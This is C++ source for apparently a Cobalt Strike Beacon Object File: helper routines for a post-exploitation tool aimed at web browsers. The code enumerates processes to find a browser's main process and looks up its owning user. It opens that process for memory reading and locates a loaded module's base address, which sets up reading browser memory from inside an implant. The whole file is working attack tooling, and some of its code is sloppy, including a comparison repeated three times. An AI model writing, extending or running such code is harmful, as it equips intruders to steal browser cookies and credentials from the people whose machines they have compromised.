
extern "C" {
#include <cstdint>
#include "../DFR.h"
#include "../beacon.h"

#define MAX_NAME 256 //Maximum name length for GetTokenUser. Don't know what the MS specification actually is

    BOOL IsWow64(HANDLE hProcess) {
        BOOL isBrowserWow64 = FALSE;
        if (!IsWow64Process(hProcess, &isBrowserWow64)) {
            BeaconPrintf(CALLBACK_ERROR, "IsWow64Process failed for browser process");
            CloseHandle(hProcess);
            return TRUE;
        }
        if (isBrowserWow64) {
            CloseHandle(hProcess);
            return TRUE;
        }

        return FALSE;
    }

    BOOL GetProcessName(HANDLE hProcess, LPCWSTR& targetBrowser) {

        wchar_t processPath[MAX_PATH];
        DWORD size = sizeof(processPath) / sizeof(processPath[0]);

        // Query the full process image name
        if (!QueryFullProcessImageNameW(hProcess, 0, processPath, &size)) {
            BeaconPrintf(CALLBACK_ERROR, "QueryFullProcessImageName failed to get target process name", GetLastError());
            return FALSE;
        }

        const wchar_t* executableName = PathFindFileNameW(processPath);
        if (wcscmp(executableName, targetBrowser) == 0)
            return TRUE;
        if (wcscmp(executableName, targetBrowser) == 0)
            return TRUE;
        if (wcscmp(executableName, targetBrowser) == 0)
            return TRUE;

        return FALSE;
    }

    BOOL GetTokenUser(IN HANDLE hProcess, wchar_t* UserName, wchar_t* DomainName, DWORD dwMaxUserName, DWORD dwMaxDomainName) {

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to OpenProcessToken! Error: %i\n", GetLastError());
            return FALSE;
        }

        PTOKEN_USER hTokenUser = { 0 };
        DWORD dwSize = 0;

        if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize)) {
            DWORD dwError = GetLastError();
            if (dwError != ERROR_INSUFFICIENT_BUFFER) {
                BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed to get token size! Error: %i\n", GetLastError());
                return FALSE;
            }
        }
        hTokenUser = (PTOKEN_USER)malloc(dwSize);
        if (hTokenUser == NULL) {
            return FALSE;
        }

        if (!GetTokenInformation(hToken, TokenUser, hTokenUser, dwSize, &dwSize)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve token information! Error: %i\n", GetLastError());
            free(hTokenUser);
            return FALSE;
        }

        UserName[0] = L'\0';
        DomainName[0] = L'\0';
        SID_NAME_USE SidUser = SidTypeUser;
        if (!LookupAccountSidW(NULL, hTokenUser->User.Sid, UserName, &dwMaxUserName, DomainName, &dwMaxDomainName, &SidUser)) {
            BeaconPrintf(CALLBACK_ERROR, "LookupAccountSidW failed! Error: %i\n", GetLastError());
            free(hTokenUser);
            return FALSE;
        }

        free(hTokenUser);
        return TRUE;
    }

    void FindAllSuitableProcesses(LPCWSTR processName)
    {
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed", GetLastError());
            return;
        }

        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            BeaconPrintf(CALLBACK_ERROR, "Process32First failed", GetLastError());
            CloseHandle(hProcessSnap);
            return;
        }

        do
        {
            if (wcscmp(pe32.szExeFile, processName) == 0)
            {
                HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);

                if (!GetProcessName(hParent, processName))
                {
                    HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

                    wchar_t UserName[MAX_NAME];
                    wchar_t DomainName[MAX_NAME];
                    if (GetTokenUser(hHandle, UserName, DomainName, MAX_NAME, MAX_NAME))
                        BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d (%ls\\%ls)\n", pe32.th32ProcessID, DomainName, UserName);
                    else
                        BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d\n", pe32.th32ProcessID);

                    CloseHandle(hHandle);
                }
                CloseHandle(hParent);
            }

        } while (Process32NextW(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
    }

    BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
    {
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed", GetLastError());
            return FALSE;
        }

        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            BeaconPrintf(CALLBACK_ERROR, "Process32First failed", GetLastError());
            CloseHandle(hProcessSnap);
            return(FALSE);
        }

        do
        {
            if (wcscmp(pe32.szExeFile, processName) == 0)
            {
                HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);

                if (!GetProcessName(hParent, processName))
                {
                    CloseHandle(hParent);

                    HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

                    BeaconPrintf(CALLBACK_OUTPUT, "Found %ls main process PID: %lu\n", processName, pe32.th32ProcessID);
                    *pid = pe32.th32ProcessID;
                    *hProcess = hHandle;
                    return TRUE;
                }
                CloseHandle(hParent);
            }

        } while (Process32NextW(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
        return FALSE;
    }

    BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress, DWORD* moduleSize) {

        size_t szModules = sizeof(HMODULE) * 1024; //Should be enough ;)
        HMODULE* hModules = (HMODULE*)malloc(szModules);
        DWORD cbNeeded;

        if (hModules == 0 || !EnumProcessModulesEx(hProcess, hModules, szModules, &cbNeeded, LIST_MODULES_ALL)) {
            BeaconPrintf(CALLBACK_ERROR, "EnumProcessModulesEx failed", GetLastError());
            free(hModules);
            return FALSE;
        }

        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
            wchar_t szModuleName[MAX_PATH];
            if (!K32GetModuleBaseNameW(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(wchar_t))) {
                BeaconPrintf(CALLBACK_ERROR, "K32GetModuleBaseNameW failed! Error: %i\n", GetLastError());
                continue;
            }
            if (_wcsicmp(szModuleName, moduleName) == 0) {
                MODULEINFO moduleInfo;
                if (!GetModuleInformation(hProcess, hModules[i], &moduleInfo, sizeof(moduleInfo))) {
                    BeaconPrintf(CALLBACK_ERROR, "GetModuleInformation failed", GetLastError());
                    free(hModules);
                    return FALSE;
                }
                baseAddress = reinterpret_cast<uintptr_t>(moduleInfo.lpBaseOfDll);
                *moduleSize = moduleInfo.SizeOfImage;
                free(hModules);
                return TRUE;
            }
        }
        free(hModules);
        return FALSE;
    }

    BOOL GetChromeHandle(DWORD pid, HANDLE* hProcess) {
        *hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (*hProcess == NULL || *hProcess == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to OpenProcess PID:%d, Error: %i\n", pid, GetLastError());
            return FALSE;
        }
        if (IsWow64(*hProcess))
        {
            BeaconPrintf(CALLBACK_ERROR, "Target process is 32bit. Only 64bit browsers are supported!\n");
            return FALSE;
        }
        return TRUE;
    }
}